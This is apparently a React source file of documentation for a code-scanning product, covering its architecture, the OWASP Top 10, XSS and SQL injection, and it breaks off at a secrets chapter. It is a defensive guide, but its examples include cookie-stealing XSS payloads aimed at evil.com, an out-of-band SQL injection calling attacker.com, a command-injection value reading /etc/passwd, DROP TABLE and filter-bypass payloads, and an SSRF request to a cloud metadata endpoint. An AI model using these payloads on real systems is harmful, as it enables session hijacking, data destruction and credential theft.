import React from 'react';
import { Shield, Lock, AlertTriangle, Code2, ShieldCheck, Zap, Activity, Globe, Server, Database, Key, Eye, Terminal, Cpu, Bug } from 'lucide-react';

export const docsContent = [
  {
    id: 'ch-introduction',
    title: 'Introduction & Architecture',
    icon: <Shield size={16} />,
    description: 'Learn the architectural foundations of DevGuard Pro and how its multi-stage analysis pipeline works.',
    sections: [
      {
        subtitle: '1.1 What Is DevGuard Pro?',
        content: `DevGuard Pro is a zero-trust, local-first Static Application Security Testing (SAST) platform built for modern developers. It bridges the gap between enterprise-grade security tooling and everyday development workflows.

At its core, DevGuard Pro performs three types of analysis on your source code:

1. HEURISTIC PATTERN SCANNING — Using regular expressions and structural analysis to detect well-known vulnerability signatures across 15+ programming languages including JavaScript, Python, Java, PHP, Go, Rust, Ruby, Swift, Kotlin, C++, TypeScript, and more.

2. AI-POWERED CONTEXTUAL REMEDIATION — A Gemini 2.5 Flash model interprets the intent behind flagged code and suggests precise, drop-in replacement patches that fix the vulnerability while preserving the original functionality.

3. HISTORICAL INTELLIGENCE — Every scan is archived to your personal Firebase database, creating a chronological security timeline that lets you track how your codebase's security posture evolves over time.

The tool is designed around the "shift-left" security philosophy: catch bugs at the point of creation, not after deployment. Research consistently shows that fixing a vulnerability during development costs 10–100x less than fixing it in production after exploitation.`
      },
      {
        subtitle: '1.2 SAST vs. DAST — Why We Chose Static Analysis',
        content: `There are two major paradigms in application security testing:

STATIC APPLICATION SECURITY TESTING (SAST)
SAST analyzes source code without executing it. Think of it like reviewing the blueprints of a building before it's constructed. Key advantages:
- Works before a single line is compiled or deployed
- 100% code path coverage including rarely-executed branches
- Pinpoints the exact file, line, and column of vulnerability origin
- Integrates directly into development workflows (pre-commit hooks, CI/CD pipelines)
- No need for a running environment

DYNAMIC APPLICATION SECURITY TESTING (DAST)
DAST tests a running application by simulating real attacks against live endpoints. Key advantages:
- Detects runtime configuration issues SAST cannot see
- Validates that deployed application behaves securely
- Uncovers issues related to server configuration, TLS settings, HTTP headers

HYBRID APPROACH (Best Practice)
Elite security teams use both. DevGuard Pro covers the SAST layer. For DAST, tools like OWASP ZAP, Burp Suite Community, or Nikto complement it perfectly.

The underlying principle of DevGuard Pro's SAST engine is "Taint Analysis" — tracking data flows from untrusted sources (req.body, URL parameters, user input forms) through the codebase until it reaches potentially dangerous "sinks" (SQL queries, shell commands, HTML rendering, file system operations).`
      },
      {
        subtitle: '1.3 The Three-Phase Analysis Pipeline',
        content: `When you click "Run Scan", DevGuard Pro executes the following internally:

PHASE 1 — TOKENIZATION & NORMALIZATION
The raw code string is normalized: comments are stripped for pattern analysis (but preserved in the output), whitespace is standardized, and the code is sectioned into logical blocks. This prevents simple obfuscation tricks like inserting spaces into keywords from bypassing detection.

PHASE 2 — SIGNATURE MATCHING (The Heuristic Engine)
The normalized code is simultaneously checked against a library of vulnerability signatures. Each signature has a severity rating (CRITICAL, HIGH, MEDIUM, LOW, INFO), a description, affected line numbers, and a remediation hint. The engine runs all checks in a single pass for maximum performance.

Signatures cover:
— Hardcoded secrets (API keys, passwords, tokens, private keys)
— Dangerous function calls (eval, exec, system, dangerouslySetInnerHTML)
— SQL injection patterns (string concatenation in query construction)
— XSS vectors (innerHTML, document.write, outerHTML assignment)
— Insecure random number generation (Math.random for security tokens)
— Weak cryptographic algorithms (MD5, SHA1, DES in security contexts)
— Prototype pollution risks (Object.assign with user input)
— Command injection vulnerabilities
— Path traversal patterns
— Insecure deserialization
— Missing rate limiting indicators
— CORS misconfiguration patterns
— XML External Entity (XXE) injection risks
— Server-Side Request Forgery (SSRF) patterns
— Insecure Direct Object Reference (IDOR) indicators

PHASE 3 — AI CONTEXTUAL LAYER (Optional)
When you trigger an AI analysis, the detected code snippets (NOT your entire codebase) are sent to the Gemini API with a structured prompt that includes the vulnerability type, surrounding context, and expected output format. The AI returns a structured JSON response with an explanation and a proposed patch. You review the diff before accepting.`
      },
      {
        subtitle: '1.4 Data Privacy & Security Policy',
        content: `We take the irony of a security tool having security vulnerabilities very seriously.

CODE HANDLING PROTOCOL
- Raw source code is processed entirely in your browser's JavaScript runtime via the heuristic engine
- Code NEVER leaves your device unless you explicitly trigger the AI Analysis feature
- When AI Analysis is triggered, only the flagged code snippet (not your full codebase) is transmitted to the Google Generative AI API over an encrypted HTTPS connection
- No code snippets are logged or retained by DevGuard Pro on any server

DATA STORED IN FIREBASE (Per-User, Isolated)
When a scan is saved, DevGuard Pro stores the following in your Firebase Firestore database under your unique user ID:
- The code snippet text
- The list of detected vulnerabilities (type, severity, line, message)
- A timestamp
- A bookmark status flag
- An auto-generated title derived from the first significant line of code

Every Firestore query is filtered by your userId, ensuring complete data isolation between accounts. No user can ever access another user's scan history.

AUTHENTICATION
DevGuard Pro uses Firebase Authentication, which is SOC 2 Type II compliant. We support email/password authentication and OAuth 2.0 sign-in via Google. Passwords are never stored — only cryptographic hashes managed entirely by Firebase.`
      }
    ]
  },
  {
    id: 'ch-owasp',
    title: 'OWASP Top 10 — Complete Guide',
    icon: <AlertTriangle size={16} />,
    description: 'A comprehensive breakdown of every OWASP Top 10 category, what it means, how to detect it, and how to prevent it.',
    sections: [
      {
        subtitle: '2.1 A01 — Broken Access Control (Most Critical)',
        content: `OWASP ranking: #1 (up from #5 in 2017). Found in 94% of tested applications.

WHAT IS IT?
Broken Access Control means users can perform actions or access data beyond their intended permissions. It's the umbrella category for all authorization failures.

COMMON MANIFESTATIONS
— Insecure Direct Object References (IDOR): Accessing /api/users/1234 and changing the 1234 to access another user's data.
— Horizontal Privilege Escalation: User A accessing User B's resources at the same permission level.
— Vertical Privilege Escalation: A regular user accessing admin-only functionality by crafting the right HTTP request.
— Missing Authorization Checks: Backend endpoints that check authentication (is the user logged in?) but not authorization (is this user ALLOWED to do this?).
— Client-Side Access Control: Hiding admin buttons via CSS/JavaScript instead of enforcing access server-side.
— JWT Token Manipulation: Altering the payload of a JSON Web Token to claim admin privileges when the signature isn't verified.
— CORS Misconfiguration: Allowing arbitrary cross-origin requests to access sensitive API endpoints.
— Force Browsing: Accessing /admin, /config.php, /backup/ directly without proper checks.

DEVGUARD PRO DETECTION
The heuristic engine flags:
- Routes that don't check userId against the requested resource ID
- In JavaScript: missing equality checks between req.user.id and fetched resource's owner
- In Python/Flask: route handlers with @login_required but no subsequent ownership validation
- In PHP: isset($_SESSION['user']) checks without comparing session user to record owner

PREVENTION STRATEGY
THE ONLY CORRECT FIX: Enforce access control server-side, on every request, for every endpoint.

Implementation pattern (Node.js/Express):
// WRONG — checks auth but not authorization
app.get('/api/document/:id', authMiddleware, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  res.json(doc);
});

// CORRECT — checks auth AND ownership
app.get('/api/document/:id', authMiddleware, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  if (!doc) return res.status(404).json({ error: 'Not found' });
  if (doc.ownerId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
  res.json(doc);
});

Additional measures:
- Implement a centralized authorization library (Casbin, CASL, OPA)
- Default to DENY for all access — explicitly grant permissions
- Log all access control failures and alert on suspicious patterns
- In REST APIs, return 404 (not 403) for unauthorized resource access to avoid leaking existence information`
      },
      {
        subtitle: '2.2 A02 — Cryptographic Failures',
        content: `OWASP ranking: #2 (previously "Sensitive Data Exposure").

WHAT IS IT?
This category covers failures related to cryptography that lead to exposure of sensitive data — including passwords, financial data, health records, and personal identifiable information (PII).

THE SPECTRUM OF FAILURES
Level 1 — No Encryption (Zero Protection)
Storing passwords in plaintext in a database. Transmitting data over HTTP instead of HTTPS. Writing API keys directly into source code or configuration files committed to public repositories.

Level 2 — Weak Encryption (False Security)
Using MD5 or SHA1 for password hashing. These algorithms are not designed for password storage — they are designed for speed, which means an attacker with a GPU can crack millions of hashes per second. Using AES-ECB mode which leaks patterns in the ciphertext. Using static, hardcoded initialization vectors (IVs).

Level 3 — Implementation Errors (Dangerous Misconfiguration)
Correct algorithm, wrong parameters. Example: Using bcrypt with a work factor of 2 (nearly instant to crack) instead of 12+ (computationally expensive to crack).

DEVGUARD PRO DETECTS
- MD5 usage: md5(password), hashlib.md5(), MessageDigest.getInstance("MD5")
- SHA1 in security contexts: crypto.createHash('sha1'), sha1sum
- Math.random() for token generation
- Hardcoded encryption keys: key = "mysecretkey1234"
- HTTP URLs in backend code suggesting non-HTTPS communication

THE CORRECT APPROACH TO PASSWORD HASHING
Use Argon2id (recommended) or bcrypt with cost factor ≥ 12.

JavaScript (Node.js):
const argon2 = require('argon2');

// Hashing
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 2 ** 16,  // 64 MB
  timeCost: 3,
  parallelism: 1
});

// Verification
const isValid = await argon2.verify(hash, plainTextPassword);

Python:
import argon2
ph = argon2.PasswordHasher(time_cost=3, memory_cost=65536)
hash = ph.hash(password)
is_valid = ph.verify(hash, password)

PHP:
$hash = password_hash($password, PASSWORD_ARGON2ID, [
  'memory_cost' => 65536,
  'time_cost' => 4,
  'threads' => 3
]);
$valid = password_verify($password, $hash);

FOR ENCRYPTION OF DATA AT REST
Use AES-256-GCM (provides both confidentiality and integrity).
Generate a unique, random IV for every encryption operation.
Never reuse keys across different data types.
Store encryption keys in a dedicated secrets manager (AWS KMS, HashiCorp Vault), never in source code.`
      },
      {
        subtitle: '2.3 A03 — Injection (SQL, NoSQL, OS Command, LDAP)',
        content: `OWASP ranking: #3. Injection vulnerabilities have been on the OWASP list since its inception in 2003.

THE CORE PRINCIPLE
Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The interpreter cannot distinguish between intended commands and attacker-supplied data.

SQL INJECTION — THE CLASSIC
Vulnerable code (PHP):
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
mysql_query($query);

Attack: Set username to: ' OR '1'='1
Result query: SELECT * FROM users WHERE username = '' OR '1'='1'
Effect: Returns ALL users from the database.

Attack: Set username to: '; DROP TABLE users; --
Result: Deletes the entire users table.

NOSQL INJECTION
MongoDB is also vulnerable to injection via JavaScript operators:
Vulnerable (Express.js):
db.users.find({ username: req.body.username, password: req.body.password });

Attack: Send password as: {"$ne": null}
Result: The $ne (not equal) operator bypasses the password check and returns the first user.

Prevention: Use BSON-safe query builders or validate that inputs are strings, not objects.

OS COMMAND INJECTION
Vulnerable (Python):
import os
filename = request.args.get('file')
os.system(f"convert {filename} output.png")

Attack: Set file to: report.pdf; cat /etc/passwd
Effect: Appends a command to read the server's password file.

PREVENTION HIERARCHY
1. PARAMETERIZED QUERIES — The Gold Standard for SQL
Use prepared statements. The query and data are always sent separately to the database driver, making injection structurally impossible.

Node.js (mysql2):
const [rows] = await db.execute('SELECT * FROM users WHERE username = ?', [req.body.username]);

Python (psycopg2):
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

Java (JDBC):
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();

2. ORM USAGE
ORMs like Sequelize, Prisma, SQLAlchemy, and Hibernate automatically use parameterized queries.

3. STORED PROCEDURES (with caution)
If using stored procedures, they must still use parameterization internally.

4. INPUT VALIDATION
Validate that inputs match expected formats (type, length, charset). Reject anything that doesn't conform. Never use a blocklist — use allowlists.

5. LEAST PRIVILEGE DATABASE ACCOUNTS
The database user your application connects with should only have SELECT, INSERT, UPDATE, DELETE on the specific tables it needs. Never connect as root or with admin privileges.`
      },
      {
        subtitle: '2.4 A04 — Insecure Design',
        content: `OWASP ranking: #4 (new in 2021). This is about flaws in conceptual architecture, not just implementation bugs.

WHAT IS IT?
Insecure design can't be fixed by perfect implementation. If the design itself is insecure, no amount of correct coding will make it safe.

REAL-WORLD EXAMPLES

Example 1: Password Reset via Security Questions
The design is inherently flawed. Security questions have low entropy — most answers are publicly findable on social media. The correct modern design uses time-limited single-use tokens sent to a verified email or phone number.

Example 2: Credential Recovery by Revealing the Password
A system that can show you your existing password means passwords are stored unencrypted. The correct design stores only a hash — making it architecturally impossible to reveal the original password.

Example 3: Unlimited Login Attempts
If there's no lockout mechanism, attackers can attempt billions of password combinations. The correct design includes progressive delays, CAPTCHA challenges, and account lockouts after N failed attempts.

Example 4: Single-Factor Authentication for Sensitive Operations
Wire transfers, account deletion, and role changes should require additional step-up authentication even for already-authenticated users.

THREAT MODELING — YOUR PRIMARY TOOL
Every major feature should undergo threat modeling before implementation:
1. What are we building? (diagrams, data flows)
2. What can go wrong? (STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)
3. What should we do about each threat?
4. Did our countermeasures work?

DESIGN PATTERNS THAT PREVENT INSECURE DESIGN
- Defense in depth: Multiple independent security controls
- Separation of duties: No single person/system can complete a sensitive action alone
- Fail secure: When a system fails, it locks down (doesn't open up)
- Complete mediation: Every access to every resource is checked`
      },
      {
        subtitle: '2.5 A05 — Security Misconfiguration',
        content: `OWASP ranking: #5. The most common vulnerability class by prevalence.

WHAT COUNTS AS MISCONFIGURATION?

1. DEFAULT CREDENTIALS
Shipping software with default admin/password or admin/admin credentials that users rarely change. Databases (MongoDB, Elasticsearch) exposed to the internet with no authentication.

2. UNNECESSARY FEATURES ENABLED
Debug endpoints left enabled in production (/actuator/env, /__debug__, /phpinfo.php).
Verbose error messages exposing stack traces, file paths, and database connection strings to end users.
Directory listing enabled on web servers.

3. IMPROPER CLOUD PERMISSIONS
S3 buckets set to public read/write (a shockingly common cause of massive data breaches).
IAM roles with wildcard (*) permissions.
Security groups open to 0.0.0.0/0 for sensitive ports.

4. MISSING SECURITY HEADERS
This is where most web applications fail silently. Every HTTPS response should include:
- Content-Security-Policy: Restricts which scripts, styles, and resources can load
- X-Frame-Options: DENY or SAMEORIGIN — prevents clickjacking
- X-Content-Type-Options: nosniff — prevents MIME type sniffing attacks
- Referrer-Policy: Controls what referrer information is sent
- Permissions-Policy: Restricts browser feature access (camera, microphone, etc.)
- Strict-Transport-Security: Forces HTTPS for a defined period
- Cache-Control: Prevents caching of sensitive responses

USE HELMET.JS (Node.js) — Single Line Fix:
const helmet = require('helmet');
app.use(helmet());

This adds 10+ security headers automatically with sensible defaults.

5. UNPATCHED SOFTWARE
Running outdated versions of frameworks, libraries, OS packages with known CVEs. This overlaps with A06 (Vulnerable and Outdated Components).

AUTOMATED CONFIGURATION AUDITING
Tools: ScoutSuite (multi-cloud), Prowler (AWS), Checkov (IaC), Trivy (containers)
Run these in CI/CD to catch misconfigurations before they reach production.`
      },
      {
        subtitle: '2.6 A06 — Vulnerable and Outdated Components',
        content: `OWASP ranking: #6. The 2021 Log4Shell vulnerability (CVSSv3: 10.0 — maximum severity) affected millions of applications through a single outdated library.

THE SUPPLY CHAIN PROBLEM
Modern applications are 80–90% third-party code. Your npm package might directly depend on 50 packages, but each of those depends on dozens more. The average Node.js project has 1,000+ transitive dependencies. Any one of them can be compromised.

ATTACK VECTORS
1. Dependency Confusion: An attacker publishes a malicious package to npm with the same name as your private internal package. npm accidentally resolves to the public (malicious) version.

2. Typosquatting: Packages named color (legitimate) vs colours (malicious) — caught in 2021 in a massive attack targeting developers.

3. Account Takeover: Attackers compromise a legitimate package maintainer's npm account and push a malicious update.

4. Abandoned Packages: The original maintainer transfers ownership to an unknown party, who later publishes malicious code.

AUDIT COMMANDS
npm audit                          # List all known vulnerabilities
npm audit fix                      # Auto-fix safe updates
npm audit fix --force              # Force-fix including breaking changes (review carefully)
npx snyk test                      # More comprehensive vulnerability database
pip audit                          # Python equivalent
bundle audit                       # Ruby equivalent
mvn dependency-check:check         # Java

GITHUB DEPENDABOT
Enable Dependabot in your repository settings. It automatically creates pull requests to update outdated dependencies with known CVEs.

SBOM (SOFTWARE BILL OF MATERIALS)
In 2021, US Executive Order 14028 mandated SBOMs for all software sold to the federal government. An SBOM is a formal inventory of all components in your software.
Generate with: syft my-image:latest -o spdx-json

WHAT TO DO WITH AUDIT RESULTS
1. CRITICAL and HIGH severities: Fix immediately before any deployment
2. MEDIUM severities: Fix within current sprint
3. LOW and INFO: Schedule for next maintenance window
4. Maintain a risk register for exceptions with justification and owner`
      },
      {
        subtitle: '2.7 A07 — Identification and Authentication Failures',
        content: `OWASP ranking: #7 (formerly Broken Authentication, #2).

CREDENTIAL ATTACKS
Brute Force: Systematically trying all possible passwords.
Credential Stuffing: Using leaked username/password pairs from other breaches to attempt login. (85% of login attacks in 2024 were credential stuffing.)
Password Spraying: Using a small set of common passwords (Spring2024!, Company123) against many accounts. Avoids account lockouts by staying under the threshold.

WHAT DEVGUARD PRO FLAGS
- login() functions without rate limiting implementation
- Session management using Math.random() for session IDs
- Cookie creation without HttpOnly and Secure flags
- JWT verification code that doesn't enforce algorithm

SECURE AUTHENTICATION IMPLEMENTATION

Rate Limiting (Node.js with express-rate-limit):
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 attempts per IP
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.post('/login', loginLimiter, loginHandler);

MULTI-FACTOR AUTHENTICATION (MFA)
MFA reduces account compromise risk by 99.9% (Microsoft data, 2019).

Implementation priority:
1. Hardware security keys (FIDO2/WebAuthn) — Phishing-proof, highest assurance
2. TOTP authenticator apps (Google Authenticator, Authy) — Strong, widely supported
3. Push notifications (Duo, Okta Verify) — Good UX, vulnerable to push fatigue attacks
4. Email OTP — Acceptable for low-risk applications
5. SMS OTP — Vulnerable to SIM swapping, use as last resort only

SESSION MANAGEMENT
- Session IDs must be at least 128 bits of cryptographically random data
- Regenerate session ID after successful authentication (prevents session fixation)
- Set Secure, HttpOnly, SameSite=Strict on session cookies
- Implement absolute session timeout (e.g., 8 hours) and idle timeout (e.g., 30 minutes)
- On logout, invalidate the session both client-side AND server-side`
      },
      {
        subtitle: '2.8 A08 — Software and Data Integrity Failures',
        content: `OWASP ranking: #8 (new in 2021, replacing XML External Entities). This is the category that covers the 2020 SolarWinds attack — one of the most devastating supply chain attacks in history.

WHAT IS IT?
Failures to verify the integrity of software or data from external sources, including application updates, CDN-hosted scripts, and data pipelines.

ATTACK SCENARIOS

CDN-Hosted Script Injection:
<script src="https://cdn.example.com/library.min.js"></script>
If the CDN is compromised, every visitor to every website using this script runs the attacker's code. No warning. No indication anything is wrong.

Fix — Subresource Integrity (SRI):
<script 
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGAGe9XY7H[...]"
  crossorigin="anonymous">
</script>
The browser verifies the script's hash matches before executing it. If anyone modifies the file, the hash won't match and the script won't run.

INSECURE DESERIALIZATION
When applications deserialize data from untrusted sources without verification, attackers can craft malicious serialized objects that execute code when deserialized.

Vulnerable (Java):
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // DANGEROUS if input is untrusted

Never deserialize data from untrusted sources without:
1. Type validation (allowlist of acceptable classes)
2. Digital signature verification of the serialized data
3. Using a safer format like JSON instead of Java/Python/PHP native serialization

CI/CD PIPELINE INTEGRITY
Every build artifact should be signed. Verify signatures before deployment.
Tools: Sigstore/Cosign for container image signing, npm package provenance.`
      },
      {
        subtitle: '2.9 A09 — Security Logging and Monitoring Failures',
        content: `OWASP ranking: #9. The average attacker dwell time (breach to detection) in 2023 was 200+ days. Proper logging and monitoring is the only way to know you've been breached.

WHAT MUST BE LOGGED
Authentication Events:
- Successful logins (with user ID, IP, timestamp, user agent)
- Failed login attempts (same metadata)
- Password changes and resets
- MFA setup/removal events
- Account lockouts

Authorization Events:
- Access to sensitive resources
- ALL failed access control checks (these are your early warning system)
- Role and permission changes

Data Events:
- Bulk data reads (potential data exfiltration)
- Mass deletion operations
- Export operations

Administrative Events:
- Configuration changes
- User management actions (create/delete/modify accounts)
- System integrations added/removed

WHAT MUST NOT BE LOGGED
- Passwords (plaintext or hashed)
- Session tokens or JWT tokens
- Credit card numbers, CVVs
- Social security numbers
- Personal health information
- API keys or secrets
- Any PII beyond what's strictly necessary

LOG FORMAT (Structured, Machine-Readable):
{
  "timestamp": "2026-04-19T10:30:00.000Z",
  "level": "WARN",
  "event": "auth.login_failed",
  "userId": null,
  "ipAddress": "203.0.113.42",
  "userAgent": "Mozilla/5.0...",
  "requestId": "req_abc123xyz",
  "metadata": {
    "attemptedEmail": "admin@company.com",
    "reason": "invalid_credentials"
  }
}

ALERTING THRESHOLDS (Configure in your SIEM)
- >5 failed logins from single IP in 5 minutes → Alert
- Admin panel access from new IP → Alert
- >100 API requests per minute from single user → Alert
- Any access from known malicious IP ranges (threat intel feeds) → Block + Alert
- Database query volume 3x normal baseline → Alert`
      },
      {
        subtitle: '2.10 A10 — Server-Side Request Forgery (SSRF)',
        content: `OWASP ranking: #10 (new in 2021, added due to severity despite less common occurrence).

WHAT IS SSRF?
An attacker tricks the server into making HTTP requests to an unintended destination — either an internal network resource or an external service — using the server's identity and network position.

THE ATTACK SCENARIO
Imagine a web application with a feature: "Enter a URL and we'll show you a preview of that webpage." The server fetches the URL server-side. An attacker enters: http://169.254.169.254/latest/meta-data/iam/security-credentials/

This is the AWS EC2 Instance Metadata Service endpoint. If the server fetches it, the attacker receives the server's AWS credentials — giving them full access to the cloud account. This exact attack was used in the 2019 Capital One breach, exposing 100 million customer records.

REAL CODE EXAMPLES

Vulnerable Node.js:
app.post('/preview', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url); // SSRF vulnerability
  const html = await response.text();
  res.send(html);
});

Vulnerable Python:
@app.route('/webhook-test', methods=['POST'])
def test_webhook():
    url = request.json['url']
    r = requests.get(url)  # SSRF vulnerability
    return r.text

PREVENTION

1. ALLOWLIST VALIDATION — Only permit known-good domains:
const ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com'];
const { hostname } = new URL(userUrl);
if (!ALLOWED_DOMAINS.includes(hostname)) {
  return res.status(400).json({ error: 'Domain not permitted' });
}

2. BLOCK PRIVATE IP RANGES — Never allow requests to:
- 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (private IPv4)
- 169.254.0.0/16 (link-local — where cloud metadata services live!)
- ::1, fc00::/7 (IPv6 private ranges)
- localhost, 127.0.0.0/8

3. USE A URL PARSING LIBRARY — Don't parse URLs manually with regex.

4. DISABLE UNNECESSARY URL FETCH FEATURES in your application server.

5. NETWORK LAYER DEFENSE — Firewall rules preventing outbound requests from app servers to internal networks.`
      }
    ]
  },
  {
    id: 'ch-xss',
    title: 'XSS & Injection — Deep Dive',
    icon: <Code2 size={16} />,
    description: 'An exhaustive technical guide to Cross-Site Scripting, SQL Injection, Command Injection, and all major injection vulnerability classes.',
    sections: [
      {
        subtitle: '3.1 The Complete XSS Taxonomy',
        content: `XSS (Cross-Site Scripting) allows attackers to inject malicious scripts into content served to other users. Despite being one of the oldest web vulnerabilities (first documented in 1999), it remains in the OWASP Top 10 in 2024.

TYPE 0 — DOM-BASED XSS (Client-Side Only)
The vulnerability exists entirely in the client-side JavaScript. The payload never reaches the server. The browser itself is the interpreter.

Vulnerable code:
// URL: https://app.com/page?name=<script>alert(1)</script>
const params = new URLSearchParams(window.location.search);
document.getElementById('greeting').innerHTML = 'Hello, ' + params.get('name');

The browser reads the URL parameter and injects it directly into the DOM. No server involved.

Common DOM XSS sinks (dangerous):
- element.innerHTML = userInput
- element.outerHTML = userInput
- document.write(userInput)
- document.writeln(userInput)
- element.insertAdjacentHTML('beforeend', userInput)
- location.href = userInput (JavaScript execution via javascript: protocol)
- eval(userInput)
- setTimeout(userInput, 1000)
- setInterval(userInput, 1000)
- new Function(userInput)()

TYPE 1 — REFLECTED XSS (Non-Persistent)
The malicious payload is included in the URL or request, reflected back by the server in the response, and executed in the victim's browser. Requires social engineering (tricking the victim into clicking a crafted link).

Attack URL: https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

TYPE 2 — STORED XSS (Persistent — Most Dangerous)
The payload is stored in the database (in a comment, user profile, product review, message, etc.) and executed every time any user views the infected content.

Example attack chain:
1. Attacker posts a comment: Nice article! <img src=x onerror="fetch('https://evil.com/steal?session='+document.cookie)">
2. Server stores the comment verbatim
3. Every user who loads the page fires the XSS payload
4. Their session cookies are sent to the attacker's server
5. Attacker uses the session cookie to impersonate the victim

IMPACT OF XSS
- Session hijacking (steal/forge session cookies)
- Account takeover (modify email, password via AJAX calls using victim's session)
- Credential harvesting (inject fake login forms)
- Cryptocurrency wallet draining (used in multiple DeFi hacks worth millions)
- Browser-based malware distribution
- Internal network scanning via the victim's browser
- Full UI redress / clickjacking
- Keylogging
- Webcam/microphone activation (if browser permissions allow)`
      },
      {
        subtitle: '3.2 XSS Prevention — The Complete Defense Stack',
        content: `A single XSS prevention technique is insufficient. Use all layers simultaneously.

LAYER 1 — OUTPUT ENCODING (Core Defense)
Encode all dynamic data before outputting it into the HTML response. Use context-appropriate encoding:

HTML Context:
< becomes &lt;
> becomes &gt;
& becomes &amp;
" becomes &quot;
' becomes &#x27;

JavaScript Context:
Escape special characters with Unicode escapes.
Use: JSON.stringify() when embedding data in JS
Never: <script>var data = "USER_INPUT"</script>

URL Context:
encodeURIComponent() for URL parameters
encodeURI() for full URLs only

React does HTML encoding automatically for JSX expressions:
const userInput = '<script>alert(1)</script>';
return <div>{userInput}</div>; // Safe — rendered as text
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // DANGEROUS

LAYER 2 — CONTENT SECURITY POLICY (CSP)
CSP is a browser mechanism that tells the browser which resources are allowed to load and execute. A strong CSP can prevent XSS execution even if an injection point is missed.

Strict CSP header example:
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{randomNonce}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.yourservice.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';

The nonce approach: Generate a cryptographically random nonce per request. Only scripts with that nonce attribute (which only the server knows) will execute.

Python (Flask):
import secrets
@app.before_request
def set_csp_nonce():
  g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def set_csp_header(response):
  nonce = g.get('csp_nonce', '')
  response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
  return response

LAYER 3 — DOMPURIFY (When innerHTML Is Required)
When you MUST render user-controlled HTML (rich text editors, CMS content), use DOMPurify:

import DOMPurify from 'dompurify';

// Configure strictly
const config = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^https?:\/\//i  // Only allow http/https URLs
};

const safeHTML = DOMPurify.sanitize(userContent, config);
document.getElementById('content').innerHTML = safeHTML;

LAYER 4 — HTTPONLY AND SECURE COOKIE FLAGS
Even if XSS occurs, HttpOnly cookies cannot be read by JavaScript, limiting session theft:

Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

LAYER 5 — X-XSS-PROTECTION HEADER (Legacy Browsers)
X-XSS-Protection: 1; mode=block
Enables the built-in XSS filter in older browsers (Chrome 4-78, IE, Edge Legacy).`
      },
      {
        subtitle: '3.3 Advanced SQL Injection — Beyond the Basics',
        content: `SQL Injection is 30 years old and still affects millions of applications. Here's the complete picture.

INJECTION TYPES

1. CLASSIC (IN-BAND) SQLi
The attacker sees the results of the injected query directly in the HTTP response.
Error-based: Database error messages contain useful schema information.
Union-based: UNION SELECT extracts data from other tables.

2. BLIND SQLi
No data is returned in the response, but the attacker can infer information.
Boolean-based: Inject conditions and observe different application behavior.
  - ' AND SUBSTRING(username,1,1)='a'-- 
Time-based: Use SLEEP() to confirm injection when no visible difference exists.
  - '; IF (1=1) WAITFOR DELAY '0:0:5'--

3. OUT-OF-BAND SQLi
Exfiltrates data via DNS or HTTP requests from the database server.
  - '; EXEC master..xp_cmdshell('nslookup data.attacker.com')--
Used when the application doesn't show errors or behavioral differences.

SECOND-ORDER INJECTION
The payload is stored safely at first, then executed when retrieved later in a different context. Example: Username 'admin'-- stored safely, but used in an UPDATE query later without proper escaping.

DEVGUARD PRO DETECTION PATTERNS
Every form of string concatenation in a query context is flagged:
JavaScript:
  db.query("SELECT " + req.body.field + " FROM users")
  `SELECT * FROM orders WHERE id = ${req.params.id}`

Python:
  cursor.execute("SELECT * FROM users WHERE id = " + user_id)
  cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")

PHP:
  mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id']);

Java:
  stmt = conn.createStatement();
  stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);

BYPASSING NAIVE FILTERS (Why You Can't Rely on Input Sanitization)
Many developers try to filter SQL injection by removing or escaping single quotes. Attackers bypass this with:
- Integer injection: WHERE id = 1 OR 1=1 (no quotes needed)
- URL encoding: %27 instead of '
- Double URL encoding: %2527
- Unicode encoding: %ef%bc%87 (fullwidth apostrophe)
- Comment variations: /*, --, #, ;--
- Case variation: sElEcT instead of SELECT (SQL is case-insensitive)
- Whitespace substitution: SELECT/**/username/**/FROM/**/users

THE ONLY REAL FIX: Parameterized queries make injection structurally impossible — not just hard.`
      }
    ]
  },
  {
    id: 'ch-secrets',
    title: 'Secrets & Cryptography',
    icon: <Lock size={16} />,
    description: 'The complete guide to secrets management, key rotation, cryptographic best practices, and zero-trust credential handling.',
    sections: [
      {
        subtitle: '4.1 The Secret Exposure Epidemic',
        content: `GitGuardian's 2024 State of Secrets Sprawl report found 12.8 million secrets hardcoded in public GitHub commits — a 28% increase year-over-year.

WHY DEVELOPERS HARDCODE SECRETS
